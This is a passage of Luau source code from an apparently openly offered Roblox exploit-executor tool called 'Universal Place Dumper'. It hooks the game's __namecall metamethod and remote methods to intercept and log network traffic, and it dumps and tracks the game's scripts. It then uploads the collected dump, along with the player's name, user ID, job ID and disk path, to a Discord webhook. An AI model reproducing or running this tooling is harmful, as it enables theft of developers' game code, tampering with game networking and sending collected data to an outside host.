			end
			if #obs > 0 then
				appendText("remotes/observations.jsonl", table.concat(obs, "\n") .. "\n")
			end
			Live.pending = {}
		end
	end
	local hooked = 0
	for _ in pairs(Live.remotesHooked) do
		hooked += 1
	end
	writeJson("live/status.json", {
		at = os.time(),
		events = Live.n,
		remotesHooked = hooked,
		pendingFlushed = flushed,
		running = Core.running,
		note = "Pending queue is cleared after each successful flush. recent[] is UI-only.",
	})
	if os.clock() - Live.lastCatalogWrite > 30 then
		pcall(writeRemoteCatalog)
	end
	Live.lastFlush = os.clock()
end

local function pushRemoteEvent(dir, method, remote, args, n, returns, retN, source)
	local path = "?"
	local className = nil
	pcall(function()
		path = replacePlayerName(instancePath(remote))
		className = remote.ClassName
	end)
	local argsSer, trunc, argsText, argTypes, complete = serializeArgList(args, n)
	local retSer, retTrunc, retText = nil, nil, nil
	if returns then
		local retComplete
		retSer, retTrunc, retText, _, retComplete = serializeArgList(returns, retN)
		if retTrunc and (retTrunc.arguments or retTrunc.depth or retTrunc.stringMax or retTrunc.tableEntries) then
			trunc = trunc or {}
			trunc.returns = retTrunc
		end
		if retComplete == false then
			complete = false
		end
	end
	if next(trunc) == nil then
		trunc = nil
	else
		complete = false
	end
	observeRemoteCall(path, className, dir, argTypes)
	local role = "event"
	if method == "OnClientInvoke" or method == "InvokeServer" then
		role = "invoke"
	end
	livePush({
		dir = dir,
		method = method,
		source = source,
		remote = path,
		class = className,
		family = className,
		role = role,
		args = argsSer,
		returns = retSer,
		argsText = argsText,
		retText = retText,
		truncated = trunc,
		complete = complete ~= false,
		thread = tostring(coroutine.running()),
	})
end

wrapOnClientInvoke = function(remote)
	if not Config.liveIntercept or not remote or not remote:IsA("RemoteFunction") then
		return
	end
	local existing = nil
	pcall(function()
		existing = remote.OnClientInvoke
	end)
	if Live.invokeWrap[remote] and existing == Live.invokeWrap[remote] then
		return
	end
	local prev = existing
	if prev and prev == Live.invokeWrap[remote] then
		prev = Live.invokePrev[remote]
	end
	Live.invokePrev[remote] = prev
	local wrap
	wrap = function(...)
		local n = select("#", ...)
		local args = { ... }
		if not prev then
			task.defer(function()
				pushRemoteEvent("S2C", "OnClientInvoke", remote, args, n, nil, nil, "OnClientInvoke")
			end)
			return
		end
		local packed = table.pack(pcall(prev, ...))
		if packed[1] then
			local results = { table.unpack(packed, 2, packed.n) }
			local retN = packed.n - 1
			task.defer(function()
				pushRemoteEvent("S2C", "OnClientInvoke", remote, args, n, results, retN, "OnClientInvoke")
			end)
			return table.unpack(packed, 2, packed.n)
		end
		task.defer(function()
			pushRemoteEvent("S2C", "OnClientInvoke", remote, args, n, nil, nil, "OnClientInvoke")
		end)
		error(packed[2], 0)
	end
	Live.invokeWrap[remote] = wrap
	pcall(function()
		remote.OnClientInvoke = wrap
	end)
end

hookRemoteIncoming = function(remote)
	if not Config.liveIntercept or Live.remotesHooked[remote] then
		return
	end
	Live.remotesHooked[remote] = true
	ensureRemoteRecord(remote)
	if remote:IsA("RemoteEvent") or remote:IsA("UnreliableRemoteEvent") then
		trackConn(remote.OnClientEvent:Connect(function(...)
			local n = select("#", ...)
			local args = { ... }
			task.defer(function()
				pushRemoteEvent("S2C", "OnClientEvent", remote, args, n, nil, nil, "OnClientEvent")
			end)
		end))
	end
	if remote:IsA("RemoteFunction") then
		wrapOnClientInvoke(remote)
	end
end

local function dumpLateScript(inst, sourceTag)
	if not isScript(inst) or isIgnored(inst) then
		return
	end
	local path = instancePath(inst)
	local sid = stableIdOf(inst)
	if ScriptSeen[sid] or ScriptSeen[path] then
		local newHash = nil
		if getScriptHash then
			pcall(function()
				newHash = getScriptHash(inst)
			end)
		end
		local old = ScriptHashByPath[path]
		if type(newHash) == "string" and newHash ~= "" and old and newHash ~= old and ScriptsDumped < Config.maxScripts then
			dumpOneScript({
				script = inst,
				path = path,
				stableId = sid,
				class = inst.ClassName,
				source = "hash-changed",
				discovery = { "hash-changed" },
				isNil = not inst:IsDescendantOf(game),
			})
			writeScriptMetadata()
			livePush({
				dir = "INST",
				method = "ScriptHashChanged",
				remote = replacePlayerName(path),
				class = inst.ClassName,
				argsText = old .. " -> " .. newHash,
				source = sourceTag,
			})
			return
		end
		for _, meta in ipairs(ScriptMeta) do
			if meta.path == replacePlayerName(path) then
				meta.last_seen = os.time()
				break
			end
		end
		return
	end
	if ScriptsDumped >= Config.maxScripts then
		livePush({
			dir = "INST",
			method = "ScriptAddedCapped",
			remote = replacePlayerName(path),
			class = inst.ClassName,
			argsText = inst.ClassName,
			source = sourceTag,
		})
		return
	end
	local entry = {
		script = inst,
		path = path,
		stableId = sid,
		class = inst.ClassName,
		source = sourceTag,
		discovery = { sourceTag },
		isNil = not inst:IsDescendantOf(game),
	}
	dumpOneScript(entry)
	ScriptIndex.dumped = ScriptsDumped
	writeScriptMetadata()
	livePush({
		dir = "INST",
		method = "ScriptAdded",
		remote = replacePlayerName(path),
		class = inst.ClassName,
		argsText = inst.ClassName,
		source = sourceTag,
	})
end

local function hookAllRemotes()
	local n = 0
	for _, inst in ipairs(game:GetDescendants()) do
		if isNetworkRemote(inst) then
			hookRemoteIncoming(inst)
			n += 1
		end
	end
	trackConn(game.DescendantAdded:Connect(function(inst)
		task.defer(function()
			if not Core.running then
				return
			end
			if isNetworkRemote(inst) then
				hookRemoteIncoming(inst)
				livePush({
					dir = "INST",
					method = "RemoteAdded",
					remote = replacePlayerName(instancePath(inst)),
					class = inst.ClassName,
					argsText = inst.ClassName,
					source = "DescendantAdded",
				})
			elseif isScript(inst) then
				dumpLateScript(inst, "DescendantAdded")
			end
		end)
	end))
	log("done", "live S2C listeners on " .. n .. " remotes")
end

local function watchLeaderstats()
	if not Config.liveWatchStats then
		return
	end
	local ls = LocalPlayer:FindFirstChild("leaderstats")
	if not ls then
		trackConn(LocalPlayer.ChildAdded:Connect(function(child)
			if child.Name == "leaderstats" then
				watchLeaderstats()
			end
		end))
		return
	end
	for _, v in ipairs(ls:GetDescendants()) do
		if v:IsA("ValueBase") then
			trackConn(v:GetPropertyChangedSignal("Value"):Connect(function()
				local ser = serializeValue(v.Value)
				livePush({
					dir = "STAT",
					method = "leaderstats",
					name = v.Name,
					path = replacePlayerName(instancePath(v)),
					args = { ser },
					argsText = compactValue(ser),
					source = "leaderstats",
				})
			end))
		end
	end
end

local function watchCharacter(char)
	if not Config.liveWatchCharacter or not char then
		return
	end
	local hum = char:FindFirstChildOfClass("Humanoid")
	if hum then
		trackConn(hum:GetPropertyChangedSignal("Health"):Connect(function()
			livePush({
				dir = "STAT",
				method = "Health",
				name = LocalPlayer.Name,
				argsText = string.format("%.1f/%.1f", hum.Health, hum.MaxHealth),
				source = "Humanoid",
			})
		end))
		trackConn(hum.Died:Connect(function()
			livePush({ dir = "STAT", method = "Died", name = LocalPlayer.Name, argsText = "", source = "Humanoid" })
		end))
	end
end

local function callWithC2SGuard(fn, ...)
	Live.c2sGuard += 1
	local packed = table.pack(pcall(fn, ...))
	Live.c2sGuard -= 1
	if not packed[1] then
		error(packed[2], 0)
	end
	return table.unpack(packed, 2, packed.n)
end

local function logC2S(self, method, args, n, results, retN, source)
	if not Core.running or not Config.liveIntercept then
		return
	end
	if checkCaller and checkCaller() then
		return
	end
	if typeof(self) ~= "Instance" then
		return
	end
	if method == "FireServer" or method == "InvokeServer" then
		if not (self:IsA("RemoteEvent") or self:IsA("RemoteFunction") or self:IsA("UnreliableRemoteEvent")) then
			return
		end
	end
	pushRemoteEvent("C2S", method, self, args, n, results, retN, source)
end

local function hookC2SMethods()
	if not hookFn then
		return 0
	end
	local hooked = 0
	local specs = {
		{ "RemoteEvent", "FireServer" },
		{ "RemoteFunction", "InvokeServer" },
		{ "UnreliableRemoteEvent", "FireServer" },
	}
	for _, spec in ipairs(specs) do
		local className, methodName = spec[1], spec[2]
		local ok = pcall(function()
			local dummy = Instance.new(className)
			local fn = dummy[methodName]
			dummy:Destroy()
			if typeof(fn) ~= "function" then
				return
			end
			local old
			old = hookFn(fn, newClosure(function(self, ...)
				if Live.c2sGuard > 0 then
					return old(self, ...)
				end
				local n = select("#", ...)
				local args = { ... }
				if methodName == "InvokeServer" then
					local results = table.pack(callWithC2SGuard(old, self, ...))
					task.defer(function()
						logC2S(self, methodName, args, n, results, results.n, "hookfunction")
					end)
					return table.unpack(results, 1, results.n)
				end
				local results = table.pack(callWithC2SGuard(old, self, ...))
				task.defer(function()
					logC2S(self, methodName, args, n, nil, nil, "hookfunction")
				end)
				return table.unpack(results, 1, results.n)
			end))
			table.insert(Core.hookedMethods, { className = className, method = methodName, original = old })
			hooked += 1
		end)
		if not ok then
			dbgWarn("hookfunction failed", className, methodName)
		end
	end
	return hooked
end

local function installLiveIntercept()
	if not Config.liveIntercept then
		return
	end
	ensureDir(OUT .. "/live")
	hookAllRemotes()
	watchLeaderstats()
	watchCharacter(LocalPlayer.Character)
	trackConn(LocalPlayer.CharacterAdded:Connect(watchCharacter))
	local methodHooks = hookC2SMethods()
	if methodHooks > 0 then
		log("done", "live C2S method hooks=" .. methodHooks)
	end
	if hookMeta and getNamecall then
		local old
		old = hookMeta(game, "__namecall", newClosure(function(self, ...)
			if Live.c2sGuard > 0 then
				return old(self, ...)
			end
			local n = select("#", ...)
			local args = { ... }
			local method = getNamecall()
			local shouldLog = method == "FireServer" or method == "InvokeServer"
				or method == "PromptProductPurchase" or method == "PromptGamePassPurchase"
			if shouldLog and Core.running and (not checkCaller or not checkCaller()) then
				if method == "InvokeServer" then
					local results = table.pack(callWithC2SGuard(old, self, ...))
					task.defer(function()
						logC2S(self, method, args, n, results, results.n, "namecall")
					end)
					return table.unpack(results, 1, results.n)
				end
				local results = table.pack(callWithC2SGuard(old, self, ...))
				task.defer(function()
					logC2S(self, method, args, n, nil, nil, "namecall")
				end)
				return table.unpack(results, 1, results.n)
			end
			return old(self, ...)
		end))
		Core.namecallHook = old
		log("done", "live C2S namecall hook installed")
	else
		log("warn", "live C2S namecall unavailable (no hookmetamethod)")
	end
	trackConn(RunService.Heartbeat:Connect(function()
		if not Core.running then
			return
		end
		if (os.clock() - Live.lastFlush) > 3 then
			pcall(flushLiveLogs)
		end
		if os.clock() - Live.lastRewrap > 1 then
			Live.lastRewrap = os.clock()
			for remote, wrap in pairs(Live.invokeWrap) do
				local current = nil
				pcall(function()
					current = remote.OnClientInvoke
				end)
				if current ~= wrap then
					wrapOnClientInvoke(remote)
				end
			end
		end
		if Config.snapshotDiff and not Snap.busy and Snap.n > 0 and Snap.n < Config.maxSnapshots then
			if (os.clock() - Snap.lastAt) > Config.snapshotEvery then
				pcall(takeSnapshot)
			end
		end
	end))
	flushLiveLogs()
	log("done", "LIVE INTERCEPT ACTIVE — play the game, watch live/net.log grow")
	dbg("LIVE", "intercept running →", OUT .. "/live/")
end

local function getPlaceName()
	local ok, info = pcall(function()
		return MarketplaceService:GetProductInfo(game.PlaceId)
	end)
	if ok and type(info) == "table" and info.Name then
		return safePathSegment((string.gsub(info.Name, "^%s+", "")))
	end
	return "UnknownPlace"
end

local function buildOutPath(placeId, placeName)
	placeName = string.gsub(placeName, "%s+", "_")
	placeName = string.gsub(placeName, "^_+", "")
	placeName = string.gsub(placeName, "_+$", "")
	if placeName == "" then
		placeName = "Place"
	end
	return string.format("%s/%s_%s", Config.mainDir, tostring(placeId), placeName)
end

local function runPhase(name, fn)
	Log.phase = name
	if DumperUI and DumperUI.UpdateProgress then
		pcall(function()
			DumperUI.UpdateProgress(name, "Running phase: " .. name, ScriptsDumped, (ScriptIndex and ScriptIndex.totalFound) or 0)
			DumperUI.UpdateStats((ScriptIndex and ScriptIndex.totalFound) or 0, ScriptsDumped, (ScriptIndex and ScriptIndex.failed) or 0, (Coverage and Coverage.remotes and Coverage.remotes.discovered) or 0, WriteStats.ok, WriteStats.fail, OUT)
		end)
	end
	local ok, err = pcall(fn)
	if not ok then
		log("err", name .. " crashed: " .. tostring(err))
	end
	return ok
end

local function restoreInvokeWraps()
	for remote, wrap in pairs(Live.invokeWrap) do
		pcall(function()
			if remote.OnClientInvoke == wrap then
				remote.OnClientInvoke = Live.invokePrev[remote]
			end
		end)
	end
end


local function dispatchDumpToWebhook(scriptList)
	if not Config.postHttp or Config.webhookUrl == "" then
		return
	end

	if DumperUI and DumperUI.SetWebhookStatus then
		DumperUI.SetWebhookStatus("Webhook: Collecting files...", Color3.fromRGB(250, 175, 45))
		DumperUI.UpdateProgress("webhook", "Packaging dump into .txt files...", #scriptList, #scriptList)
	end
	log("boot", "Packaging full dump into .txt files for Discord webhook dispatch...")

	-- 1. Generate dump_summary.txt
	local placeId = game.PlaceId
	local placeName = getPlaceName()
	local summaryLines = {
		"============================================================",
		"                 UNIVERSAL PLACE DUMPER v" .. VERSION,
		"============================================================",
		"Place Name:       " .. tostring(placeName),
		"Place ID:         " .. tostring(placeId),
		"Job ID:           " .. tostring(game.JobId),
		"User / Player:    " .. tostring(LocalPlayer and LocalPlayer.Name or "Unknown"),
		"User ID:          " .. tostring(LocalPlayer and LocalPlayer.UserId or 0),
		"Timestamp:        " .. os.date("%Y-%m-%d %H:%M:%S"),
		"Output Folder:    " .. tostring(OUT),
		"Disk Location:    " .. tostring(DISK_ROOT .. OUT:gsub("/", "\\")),
		"------------------------------------------------------------",
		"                      STATISTICS",
		"------------------------------------------------------------",
		"Scripts Found:    " .. tostring(#scriptList),
		"Scripts Dumped:   " .. tostring(ScriptsDumped),
		"Scripts Failed:   " .. tostring(ScriptIndex.failed),
		"Scripts TimedOut: " .. tostring(#TimedOut),
		"Remotes Catalog:  " .. tostring((Coverage and Coverage.remotes and Coverage.remotes.discovered) or 0),
		"Writes OK:        " .. tostring(WriteStats.ok),
		"Writes Failed:    " .. tostring(WriteStats.fail),
		"Last Write Err:   " .. tostring(WriteStats.lastError or "None"),
		"Snapshots:        " .. tostring(Snap.n),
		"============================================================",
	}
	local summaryContent = table.concat(summaryLines, "\r\n")

	-- 2. Generate dump_log.txt
	local logContent = table.concat(Log.lines, "\r\n")

	-- 3. Generate dump_remotes.txt
	local remoteLines = {
		"============================================================",
		"                 DISCOVERED REMOTES & BINDABLES",
		"============================================================",
		string.format("%-18s | %-10s | %s", "CLASS", "CHANNEL", "PATH"),
		"------------------------------------------------------------",
	}
	for path, rec in pairs(RemoteIndex) do
		table.insert(remoteLines, string.format("%-18s | %-10s | %s", tostring(rec.class or "Remote"), tostring(rec.channel or "network"), tostring(path)))
	end
	local remotesContent = table.concat(remoteLines, "\r\n")

	-- 4. Generate dump_manifest.txt
	local manifestLines = {
		"============================================================",
		"                     SCRIPTS MANIFEST",
		"============================================================",
	}
	for _, item in ipairs(ScriptIndex.items or {}) do
		table.insert(manifestLines, string.format("[%s] %s (bytes=%d, hash=%s)", tostring(item.className or "Script"), tostring(item.path or ""), item.bytecodeSize or 0, tostring(item.hash or "none")))
	end
	local manifestContent = table.concat(manifestLines, "\r\n")

	-- Save collected txt files to disk in OUT/collected_txt
	pcall(function()
		ensureDir(OUT .. "/collected_txt")
		writeText("collected_txt/dump_summary.txt", summaryContent)
		writeText("collected_txt/dump_log.txt", logContent)
		writeText("collected_txt/dump_remotes.txt", remotesContent)
		writeText("collected_txt/dump_manifest.txt", manifestContent)
	end)

	-- Build Discord Embed Payload
	local embedPayload = {
		content = "📁 **Universal Place Dumper** — Dump Completed & Collected",
		embeds = {
			{
				title = string.format("Place Dump: %s (%d)", tostring(placeName), placeId),
				description = "Full dump successfully collected into `.txt` files attached below.",
				color = 3447003,
				fields = {
					{ name = "Place ID", value = tostring(placeId), inline = true },
					{ name = "Scripts Dumped", value = string.format("%d / %d", ScriptsDumped, #scriptList), inline = true },
					{ name = "Writes", value = string.format("%d OK / %d Fail", WriteStats.ok, WriteStats.fail), inline = true },
					{ name = "Executor Workspace Path", value = "`" .. tostring(OUT) .. "`", inline = false },
					{ name = "Likely Disk Path", value = "```\n" .. tostring(DISK_ROOT .. OUT:gsub("/", "\\")) .. "\n```", inline = false },
				},
				footer = { text = "Universal Dumper v" .. VERSION .. " • Discord Webhook Integration" },
			}
		}
	}
	local payloadJson = HttpService:JSONEncode(embedPayload)

	-- Build multipart form-data payload
	local boundary = "----DumperBoundary" .. tostring(math.random(100000000, 999999999))
	local bodyParts = {}

	table.insert(bodyParts, "--" .. boundary .. "\r\n")
	table.insert(bodyParts, 'Content-Disposition: form-data; name="payload_json"\r\n\r\n')
	table.insert(bodyParts, payloadJson .. "\r\n")

	-- 5. Generate dump_complete_bundle.txt (Master Consolidated Report)
	local bundleLines = {
		summaryContent,
		"\r\n\r\n" .. string.rep("=", 60) .. "\r\n",
		remotesContent,
		"\r\n\r\n" .. string.rep("=", 60) .. "\r\n",
		manifestContent,
		"\r\n\r\n" .. string.rep("=", 60) .. "\r\n",
		"============================================================\r\n" ..
		"                 COMPLETE CHRONOLOGICAL LOGS\r\n" ..
		"============================================================\r\n" ..
		logContent
	}
	local bundleContent = table.concat(bundleLines, "\r\n")

	pcall(function()
		writeText("collected_txt/dump_complete_bundle.txt", bundleContent)
	end)

	local uploadFiles = {
		{ name = "dump_summary.txt", content = summaryContent },
		{ name = "dump_log.txt", content = logContent },
		{ name = "dump_remotes.txt", content = remotesContent },
		{ name = "dump_manifest.txt", content = manifestContent },
		{ name = "dump_complete_bundle.txt", content = bundleContent }
	}

	for i, file in ipairs(uploadFiles) do
		table.insert(bodyParts, "--" .. boundary .. "\r\n")
		table.insert(bodyParts, string.format('Content-Disposition: form-data; name="files[%d]"; filename="%s"\r\n', i - 1, file.name))
		table.insert(bodyParts, "Content-Type: text/plain\r\n\r\n")
		table.insert(bodyParts, file.content .. "\r\n")
	end
	table.insert(bodyParts, "--" .. boundary .. "--\r\n")

	local requestBody = table.concat(bodyParts)

	if DumperUI and DumperUI.SetWebhookStatus then
		DumperUI.SetWebhookStatus("Webhook: Dispatching...", Color3.fromRGB(80, 145, 255))
	end
	log("prog", "Sending multipart dump .txt files to Discord webhook...")

	if not httpRequest then
		log("warn", "httpRequest API unavailable in this executor; saved .txt files locally to disk.")
		if DumperUI and DumperUI.SetWebhookStatus then
			DumperUI.SetWebhookStatus("Webhook: No HTTP API (Saved Local)", Color3.fromRGB(240, 75, 85))
		end
		return
	end

	local success, response = pcall(function()
		return httpRequest({
			Url = Config.webhookUrl,
			Method = "POST",
			Headers = {
				["Content-Type"] = "multipart/form-data; boundary=" .. boundary,
				["User-Agent"] = "UniversalDumper/" .. VERSION
			},
			Body = requestBody
		})
	end)

	if success and type(response) == "table" and (response.StatusCode == 200 or response.StatusCode == 204 or response.StatusMessage == "OK") then
		log("done", "Dump files delivered to Discord webhook successfully (200 OK)!")
		if DumperUI and DumperUI.SetWebhookStatus then
			DumperUI.SetWebhookStatus("Webhook: Delivered (200 OK)", Color3.fromRGB(60, 220, 130))
		end
	else
		local errCode = (type(response) == "table" and response.StatusCode) or "Error"
		log("warn", "Webhook multipart dispatch returned: " .. tostring(errCode) .. "; attempting JSON fallback...")
		local fbOk = pcall(function()
			return httpRequest({
				Url = Config.webhookUrl,
				Method = "POST",
				Headers = {
					["Content-Type"] = "application/json"
				},
				Body = payloadJson
			})
		end)
		if fbOk then
			log("done", "Webhook embed delivered successfully (fallback JSON)!")
			if DumperUI and DumperUI.SetWebhookStatus then
				DumperUI.SetWebhookStatus("Webhook: Delivered (Embed)", Color3.fromRGB(60, 220, 130))
			end
		else
			log("err", "Webhook dispatch failed: " .. tostring(errCode))
			if DumperUI and DumperUI.SetWebhookStatus then
				DumperUI.SetWebhookStatus("Webhook: Failed (" .. tostring(errCode) .. ")", Color3.fromRGB(240, 75, 85))
			end
		end
	end
end

local function runAll()
	dbg("=== DUMP START ===")
	if not probeFilesystem() then
		dbgWarn("Aborting — filesystem probe failed. Check F9 console.")
		return
	end
	local placeId = game.PlaceId
	local placeName = getPlaceName()
	OUT = buildOutPath(placeId, placeName)
	ensureDir(OUT)
	dbg("OUT path:", OUT)
	dbg("On disk:", DISK_ROOT .. OUT:gsub("/", "\\"))
	writeText("WHERE.txt", table.concat({
		"Dump output folder (executor workspace):",
		OUT,
		"",
		"Likely on disk:",
		DISK_ROOT .. OUT:gsub("/", "\\"),
		"",
		"Open that folder after the dump finishes.",
	}, "\n"))
	local exploitName, exploitVersion = "Unknown", ""
	if identifyExecutor then
		local ok, a, b = pcall(identifyExecutor)
		if ok then
			exploitName, exploitVersion = tostring(a or "Unknown"), tostring(b or "")
		end
	end
	log("boot", string.format("v%s place=%s (%s) executor=%s", VERSION, tostring(placeId), placeName, exploitName))
	if Config.disableRender then
		pcall(function()
			RunService:Set3dRenderingEnabled(false)
		end)
	end
	local metaPayload = {
		at = os.time(),
		version = VERSION,
		mode = "client",
		placeId = placeId,
		placeName = placeName,
		jobId = game.JobId,
		player = LocalPlayer.Name,
		userId = LocalPlayer.UserId,
		executor = { name = exploitName, version = exploitVersion },
		config = Config,
		schemaVersion = 1,
		capabilities = collectorCapabilities(),
		apis = {
			decompile = decompileFn ~= nil,
			getscripts = getScripts ~= nil,
			getnilinstances = getNilInstances ~= nil,
			getscriptbytecode = getBytecode ~= nil,
			getscripthash = getScriptHash ~= nil,
			getproperties = getPropertiesFn ~= nil,
			hookmetamethod = hookMeta ~= nil,
			hookfunction = hookFn ~= nil,
			getconnections = getConnections ~= nil,
			getinfo = getInfo ~= nil,
			httprequest = httpRequest ~= nil,
		},
	}
	writeJson("metadata.json", metaPayload)
	local scriptList = collectAllScripts()
	log("boot", string.format("found %d scripts", #scriptList))
	if Config.dumpRemotes then
		runPhase("remotes", dumpRemotes)
		writePhase("remotes_done")
	end
	if Config.dumpValues then
		runPhase("values", dumpValues)
		writePhase("values_done")
	end
	if Config.dumpGui then
		runPhase("gui", dumpGui)
		writePhase("gui_done")
	end
	if Config.dumpTrees then
		runPhase("trees", dumpTrees)
		writePhase("trees_done")
	end
	runPhase("assets", writeAssets)
	writePhase("assets_done")
	local hooksInstalled = false
	if Config.hookNet and Config.liveInstallEarly then
		runPhase("hooks", installLiveIntercept)
		writePhase("hooks_early")
		hooksInstalled = true
	end
	runPhase("scripts", function()
		dumpAllScripts(scriptList)
	end)
	runPhase("catalog", writeRemoteCatalog)
	writePhase("catalog_done")
	if Config.hookNet and not hooksInstalled then
		runPhase("hooks", installLiveIntercept)
		writePhase("hooks_done")
	end
	pcall(takeSnapshot)
	pcall(writeManifest)
	pcall(writeAnalysisReport)
	pcall(writeCoverage)
	writeJson("complete.json", {
		at = os.time(),
		ok = true,
		version = VERSION,
		schemaVersion = 1,
		mode = "client",
		output = OUT,
		diskPath = DISK_ROOT .. OUT:gsub("/", "\\"),
		writes = WriteStats,
		scriptInstances = #scriptList,
		scriptsDumped = ScriptsDumped,
		snapshots = Snap.n,
		coverage = Coverage,
		capabilities = collectorCapabilities(),
		message = "Dump complete. Keep playing — live/events.jsonl and snapshots/ keep updating.",
	})
	writeText("log.txt", table.concat(Log.lines, "\n"))
	if Config.disableRender then
		pcall(function()
			RunService:Set3dRenderingEnabled(true)
		end)
	end
	log("boot", string.format("COMPLETE writes=%d fail=%d → %s", WriteStats.ok, WriteStats.fail, OUT))
	dbg("=== DUMP COMPLETE ===")
	dbg("writes ok:", WriteStats.ok, "fail:", WriteStats.fail)
	if WriteStats.fail > 0 then
		dbgWarn("last error:", WriteStats.lastError)
	end
	dbg("folder:", DISK_ROOT .. OUT:gsub("/", "\\"))

	pcall(function()
		dispatchDumpToWebhook(scriptList)
	end)
	if DumperUI and DumperUI.UpdateProgress then
		pcall(function()
			DumperUI.UpdateProgress("complete", "Dump completed! All files saved & dispatched.", #scriptList, #scriptList)
			DumperUI.UpdateStats(#scriptList, ScriptsDumped, ScriptIndex.failed, (Coverage and Coverage.remotes and Coverage.remotes.discovered) or 0, WriteStats.ok, WriteStats.fail, OUT)
		end)
	end
end

env.UNIVERSAL_DUMP_UNLOAD = function()
	Core.running = false
	for _, conn in ipairs(Core.connections) do
		pcall(function()
			if typeof(conn) == "RBXScriptConnection" then
				conn:Disconnect()
			end
		end)
	end
	Core.connections = {}
	restoreInvokeWraps()
	if Core.namecallHook and hookMeta then
		pcall(function()
			hookMeta(game, "__namecall", Core.namecallHook)
		end)
	end
	pcall(flushLiveLogs)
	pcall(writeRemoteCatalog)
	pcall(takeSnapshot)
	pcall(writeManifest)
	pcall(writeAnalysisReport)
	pcall(writeCoverage)
	pcall(function()
		RunService:Set3dRenderingEnabled(true)
	end)
	if DumperUI and DumperUI.Destroy then
		pcall(DumperUI.Destroy)
	end
	_G.UniversalDumperUI = nil
	env.UNIVERSAL_DUMP_UNLOAD = nil
	print("[UniversalDumper] Completely unloaded from memory.")
end

task.spawn(function()
	local ok, err = pcall(runAll)
	if not ok then
		dbgWarn("FATAL crash:", err)
		pcall(function()
			if OUT ~= "" then
				writeText("CRASH.txt", tostring(err) .. "\n\n" .. table.concat(Log.lines, "\n"))
				writeJson("complete.json", {
					ok = false,
					version = VERSION,
					error = tostring(err),
					output = OUT,
					writes = WriteStats,
					scriptsDumped = ScriptsDumped,
				})
			end
		end)
	end
end)